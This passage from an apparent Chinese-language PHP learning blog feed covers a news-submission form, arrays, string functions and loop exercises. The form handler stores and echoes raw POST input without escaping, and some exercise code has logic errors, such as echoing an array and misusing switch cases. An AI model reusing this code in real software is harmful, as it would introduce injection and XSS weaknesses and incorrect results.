name=&quot;content&quot;&gt;&lt;br&gt;</span><br><span class="line">    日期：&lt;input type=&quot;date&quot; name=&quot;date&quot;&gt;&lt;br&gt;</span><br><span class="line">    作者：&lt;input type=&quot;author&quot; name=&quot;author&quot;&gt;&lt;br&gt;</span><br><span class="line">    热度：&lt;input type=&quot;number&quot; name=&quot;hot&quot;&gt;&lt;br&gt;</span><br><span class="line">    图片：&lt;input type=&quot;url&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $fhandle = fopen(&apos;news.db &apos;, &apos;a&apos;);</span><br><span class="line">    $arrMes = array();</span><br><span class="line">    @$arrMes[0] = $_POST[&apos;id&apos;];</span><br><span class="line">    @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]);</span><br><span class="line">    @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]);</span><br><span class="line">    @$arrMes[3] = $_POST[&apos;date&apos;];</span><br><span class="line">    @$arrMes[4] = base64_encode($_POST[&apos;author&apos;]);</span><br><span class="line">    @$arrMes[5] = $_POST[&apos;hot&apos;];</span><br><span class="line">    @$arrMes[6]= $_POST[&apos;imgUrl&apos;];</span><br><span class="line">    if($arrMes[0]!=NULL) &#123;</span><br><span class="line">        $writeMes = implode(&apos;||&apos;, $arrMes);</span><br><span class="line">        echo $writeMes;</span><br><span class="line">        $fline = fputs($fhandle, $writeMes);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fhandle);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/addNews.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note17</title>
      <link href="/2019/08/06/note17/"/>
      <url>/2019/08/06/note17/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: PHP语言中<code>while</code>和<code>for</code>的用法，以及PHP数组的用法。</p><a id="more"></a><!--export--><h3 id="1-PHP三种工作模式-文件后缀解析时有何区别"><a href="#1-PHP三种工作模式-文件后缀解析时有何区别" class="headerlink" title="1. PHP三种工作模式(文件后缀解析时有何区别)"></a>1. PHP三种工作模式(文件后缀解析时有何区别)</h3><h4 id="1-1-module模式"><a href="#1-1-module模式" class="headerlink" title="1.1 module模式"></a>1.1 module模式</h4><p>LAMP — Linux Apache Php Mysql</p><p>php作为apache模块运行，apache遇到一个php文件，，就相当于执行系统命令 <code>php a.php</code>，文件后缀解析以apache配置文件为主，如果apache认为.xxx文件时php脚本，就当作php执行。</p><h4 id="1-2-CGI模式"><a href="#1-2-CGI模式" class="headerlink" title="1.2 CGI模式"></a>1.2 CGI模式</h4><p>LNMP — Linux Nginx Php Mysql</p><p>php会监听一个端口，nginx/phpstorm/iis等中间件遇到一个php文件时，会把请求转发给php监听的端口。</p><p>有两个配置文件，一个是中间件，一个是php服务的，nginx/iis认为.xxx后缀文件是php脚本，交给php处理，但在php配置文件中，会有一个限制php5/php3/phtml/php能够被识别。</p><p><a href="https://meethanmj.github.io/2019/08/04/week3sum/" target="_blank" rel="noopener">第三周总结</a> 最底部有三种模式的对比。</p><h3 id="2-PHP数组"><a href="#2-PHP数组" class="headerlink" title="2. PHP数组"></a>2. PHP数组</h3><h4 id="2-1-数值数组"><a href="#2-1-数值数组" class="headerlink" title="2.1 数值数组"></a>2.1 数值数组</h4><p>​    自动分配ID键（ID键总是从0开始）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;);</span><br><span class="line">echo $cars[0];//输出&quot;Volvo&quot;</span><br><span class="line">echo $cars[1];//输出&quot;BMW&quot;</span><br><span class="line">echo $cars[2];//输出&quot;Toyota&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​    count()函数—获取数组的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;);</span><br><span class="line">echo count($cars);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​    遍历数值数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">$arrlength=count($cars); </span><br><span class="line">for($x=0;$x&lt;$arrlength;$x++)&#123;</span><br><span class="line">    echo $cars[$x];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>为一个数组增加一位，不适合用上述这种方法遍历。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $arr = array(&apos;name&apos;=&gt;&apos;zs&apos;, 2, &apos;age&apos;=&gt;18, 1);</span><br><span class="line">    echo $arr[&apos;name&apos;];//zs</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">    echo $arr[0];//2</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">    echo $arr[&apos;age&apos;];//18</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">    echo $arr[1];//1</span><br><span class="line">    $arr1 = array(1,2,3,4,5);</span><br><span class="line">    $arr1[0] = 6;</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">    $arr1[100] = 100;</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">    echo $arr1[0], $arr1[100];</span><br><span class="line">    for($i=0; $i&lt;=100; $i++)&#123;//610062345 报错，直到i=100时把100输出</span><br><span class="line">        echo $arr1[$i];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用<code>foreach</code>就不会报错，数值数组和关联数组混合时，关联数组并不影响数值数组的下标。</p><h4 id="2-2-关联数组"><a href="#2-2-关联数组" class="headerlink" title="2.2 关联数组"></a>2.2 关联数组</h4><p>关联数组可以指定键的数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</span><br><span class="line">    echo &quot;Peter is &quot; . $age[&apos;Peter&apos;] . &quot; years old.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>遍历关联数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</span><br><span class="line"></span><br><span class="line">    foreach($age as $x=&gt;$x_value)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $arr = array(1, 2, 3, 4, 5);</span><br><span class="line">    foreach($arr as $key =&gt; $value)&#123;</span><br><span class="line">        echo $key.&quot;=&gt;&quot;.$value;</span><br><span class="line">        echo PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">    $arr[5]=709;</span><br><span class="line">    foreach($arr as $key =&gt; $value)&#123;</span><br><span class="line">        echo $key.&quot;=&gt;&quot;.$value;</span><br><span class="line">        echo PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">    $arr[100] = 100;</span><br><span class="line">    foreach($arr as $key =&gt; $value)&#123;</span><br><span class="line">        echo $key.&quot;=&gt;&quot;.$value;</span><br><span class="line">        echo PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习2</title>
      <link href="/2019/08/06/practice2/"/>
      <url>/2019/08/06/practice2/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: PHP语言<code>if-else</code>/<code>switch-case</code>和<code>while</code>练习</p><a id="more"></a><!--export--><p><strong>题目一</strong>：输入年月日，计算是该年的多少天。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//form: year.month.day</span><br><span class="line">$date = fgets(STDIN);</span><br><span class="line">$Date = explode(&apos;.&apos;, $date);</span><br><span class="line">echo $Date;</span><br><span class="line">$year = $Date[0];</span><br><span class="line">$month = $Date[1];</span><br><span class="line">$day = $Date[2];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $year;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $month;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $day;</span><br><span class="line">if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123;</span><br><span class="line">    $flag=1;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $flag=0;</span><br><span class="line">&#125;</span><br><span class="line">switch($month)&#123;</span><br><span class="line">    case($month&lt;=2):</span><br><span class="line">        $days = 31*($month-1)+$day;</span><br><span class="line">        break;</span><br><span class="line">    case(3&lt;=$month&amp;&amp;$month&lt;=8):</span><br><span class="line">        if($flag==1)&#123;</span><br><span class="line">            if($month%2==1) &#123;</span><br><span class="line">                $days = 31 * (intval($month - 1) / 2) + 29 + 30 * (intval($month / 2) - 1) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            if($month%2==1) &#123;</span><br><span class="line">                $days = 31 * (intval($month - 1) / 2) + 28 + 30 * (intval($month / 2) - 1) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                $days = 31 * (intval($month) / 2) + 28 + 30 * (intval(($month) / 2)-2) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        if($flag==1)&#123;</span><br><span class="line">            if($month%2==1) &#123;</span><br><span class="line">                $days = 31 * (intval($month + 1) / 2) + 29 + 30 * (intval($month / 2) - 2) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            if($month%2==1) &#123;</span><br><span class="line">                $days = 31 * (intval($month + 1) / 2) + 28 + 30 * (intval($month / 2) - 2) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                $days = 31 * (intval($month) / 2) + 28 + 30 * (intval($month/ 2)-2) + $day;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">echo $days;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>代码缺点</strong>：可以看出来代码有些地方重复使用，没有达到简洁的目的，瑞年和平年在二月相差一天，完全可以通过flag这个标识来弥补。改进思路：设置一个<code>FebDays</code>的变量，把值设为28，在<code>case</code>里面不需要再次判断瑞年平年，计算days时，把flag加上，这样就可以把瑞平年分开。</p><p>改进版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//year-month-day</span><br><span class="line">$date = fgets(STDIN);</span><br><span class="line">$Date = explode(&apos;.&apos;, $date);</span><br><span class="line">echo $Date;</span><br><span class="line">$year = $Date[0];</span><br><span class="line">$month = $Date[1];</span><br><span class="line">$day = $Date[2];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $year;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $month;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $day;</span><br><span class="line">if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123;</span><br><span class="line">    $flag=1;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $flag=0;</span><br><span class="line">&#125;</span><br><span class="line">$FebDays = 28;</span><br><span class="line">switch($month)&#123;</span><br><span class="line">    case($month&lt;=2):</span><br><span class="line">        $days = 31*($month-1)+$day;</span><br><span class="line">        break;</span><br><span class="line">    case(3&lt;=$month&amp;&amp;$month&lt;=8):</span><br><span class="line">        if($month%2==1) &#123;</span><br><span class="line">            $days = 31 * (intval($month - 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 1) + $day;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        if($month%2==1) &#123;</span><br><span class="line">            $days = 31 * (intval($month + 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 2) + $day;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">echo $days;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>两段代码对比可以发现，计算天数的代码量较少的将近一半。</p><p><strong>题目二</strong>：可以一直输入学生成绩，知道输入<code>q</code>/<code>exit</code>/<code>quit</code>退出程序</p><p>思路一：在死循环里面执行代码，符合退出条件时<code>break</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">while(1)&#123;</span><br><span class="line">    echo &quot;Please Input Your Mes: &quot;;</span><br><span class="line">    $inMes = fgets(STDIN);</span><br><span class="line">    var_dump($inMes);</span><br><span class="line">    if((trim($inMes)==&quot;q&quot;)||(trim($inMes)==&quot;quit&quot;)||(trim($inMes)==&quot;exit&quot;))&#123;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">            switch ($inMes) &#123;</span><br><span class="line">                case(90 &lt;= $inMes &amp;&amp; $inMes &lt;= 100):</span><br><span class="line">                    echo &quot;Your Grade is A&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case(80 &lt;= $inMes &amp;&amp; $inMes &lt; 90):</span><br><span class="line">                    echo &quot;YourGrade is B&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case(70 &lt;= $inMes &amp;&amp; $inMes &lt; 80):</span><br><span class="line">                    echo &quot;Your Grade is C&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case(60 &lt;= $inMes &amp;&amp; $inMes &lt; 70):</span><br><span class="line">                    echo &quot;YourGrade is D&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case($inMes &lt; 60):</span><br><span class="line">                    echo &quot;YourGrade is E&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                default:</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">            echo PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>问题与解决：</p><pre><code>* 退出不成功，用`var_dump($inMes)`查看发现，系统会在输入字符后加`\n`,用`trim()`函数解决* 输入其他字符，php会把字符转换成数字，然后进行比较</code></pre><p>思路二：把退出逻辑写在while()括号内</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$Grade = fgets(STDIN);</span><br><span class="line">$sss = array(&quot;q&quot;,&quot;exit&quot;,&quot;quit&quot;);</span><br><span class="line">//如果$Grade不在$sss数组中就继续执行程序</span><br><span class="line">while(!in_array(trim($Grade), $sss))&#123;</span><br><span class="line">    switch($Grade)&#123;</span><br><span class="line">        case $Grade&gt;=90 &amp;&amp; $Grade&lt;100;</span><br><span class="line">            echo &quot;A&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case $Grade&gt;=60 &amp;&amp; $Grade&lt;90;</span><br><span class="line">            echo &quot;B&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case $Grade&lt;60 &amp;&amp; $Grade&gt;=0;</span><br><span class="line">            echo &quot;C&quot;;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            echo &apos;ERROR!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">    $Grade = fgets(STDIN);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>问题与解决：</p><pre><code>* 在处理`$Grade`与`$sss`时，想另辟蹊径，在数组`$sss`里面字符后加上`\n`但始终没有成功，最终还是对`$Grade`进行`trim()`处理。</code></pre><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note16</title>
      <link href="/2019/08/06/note16/"/>
      <url>/2019/08/06/note16/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: PHP中的运算符、字符串操作和流程控制</p><a id="more"></a><!--export--><h3 id="1-PHP运算符"><a href="#1-PHP运算符" class="headerlink" title="1. PHP运算符"></a>1. PHP运算符</h3><p>字符串和数字进行比较时，把字符串转成数字，然后比较。</p><p>NULL  False    ‘’     []       0      布尔值均为False</p><h3 id="2-PHP常用函数"><a href="#2-PHP常用函数" class="headerlink" title="2. PHP常用函数"></a>2. PHP常用函数</h3><table><thead><tr><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>addslashes($string)</td><td>‘  “  空  \    前添加\，转移特殊字符，防御SQL注入</td></tr><tr><td>bin2hex()</td><td>计算ASCII码</td></tr><tr><td>chr(ascii: 0x)</td><td>ASCII码转换成字符</td></tr><tr><td>crypt(‘passwd’ , salt)</td><td>加密函数</td></tr><tr><td>md5($str)</td><td>hash计算</td></tr><tr><td>explode(‘.’, $str)</td><td>根据提供的字符，来切割字符串，结果是一个数组</td></tr><tr><td>htmlspecialchars($payload)</td><td>‘ “ &lt; &gt; &amp; 转义特殊字符为html实体编码，防御xss</td></tr><tr><td>implode(‘.’, $str )</td><td>返回一个由数组元素组合成的字符串</td></tr><tr><td>str_ireplace(sear,rep, subj)</td><td>替换字符串</td></tr><tr><td>strchr(haystack, needle)</td><td>查找字符串，并返回字符串之后的所有内容</td></tr><tr><td>strcmp(str1, str2)</td><td>比较字符串，区分大小写</td></tr><tr><td>strlen($str)</td><td>计算字符串长度</td></tr><tr><td>substr(str, start, length)</td><td>字符串截取，按“位”截取</td></tr><tr><td>mb_substr(str, start, length)</td><td>同上，按“字”截取</td></tr><tr><td>trim($str)</td><td>去除两侧空白字符</td></tr></tbody></table><p><a href="https://www.runoob.com/php/php-ref-string.html" target="_blank" rel="noopener">PHP String函数</a></p><ul><li><p>addslashes()函数返回在预定义的字符前添加反斜杠的字符串</p><p>预定义字符是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 单引号(&apos;)</span><br><span class="line">* 双引号(&quot;)</span><br><span class="line">* 反斜杠(\)</span><br><span class="line">* NULL</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = addslashes(&quot;what does &quot;yolo&quot; mean?&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">$str = addslashes(&quot;what does &apos;yolo&apos; mean?&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">$str = addslashes(&quot;what does \yolo\ mean?&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">$str = addslashes(&quot;what does \x00 mean?&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">what does \"yolo\" mean?</span></span><br><span class="line"><span class="comment">what does \'yolo\' mean?</span></span><br><span class="line"><span class="comment">what does \\yolo\\ mean?</span></span><br><span class="line"><span class="comment">What does \0 mean?</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li>bin2hex()把ASCII值返回字符；chr()把指定ASCII值返回字符。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo bin2hex(&quot;\n&quot;);</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo chr(0x61);</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">$str = bin2hex(&quot;Hello World!&quot;);</span><br><span class="line">echo($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0a</span></span><br><span class="line"><span class="comment">a</span></span><br><span class="line"><span class="comment">48656c6c6f20576f726c6421</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li>crypt(str, salt)返回使用DES、Blowfish或MD5算法加密的字符串</li><li>md5()计算字符串的MD5散列</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> crypt(<span class="string">'123456'</span>, <span class="string">'rl'</span>);</span><br><span class="line">$str = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* explode(separator, string, limit)使用一个字符串分割另一个字符串，并返回字符串组成的数组</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 